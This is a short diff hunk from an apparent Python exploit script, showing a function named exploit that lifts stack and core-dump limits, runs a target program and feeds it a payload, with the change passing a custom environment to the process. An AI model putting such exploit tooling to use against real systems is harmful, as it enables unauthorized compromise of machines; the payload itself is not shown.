@@ -150,7 +150,7 @@ def exploit(vuln):
     args = sys.argv[1:]
     resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
     resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
-    P = Popen(args, stdin=PIPE)
+    P = Popen(args, stdin=PIPE, env=env)
     P.stdin.write(payload + "\\n")
     while True:
         line = sys.stdin.readline()
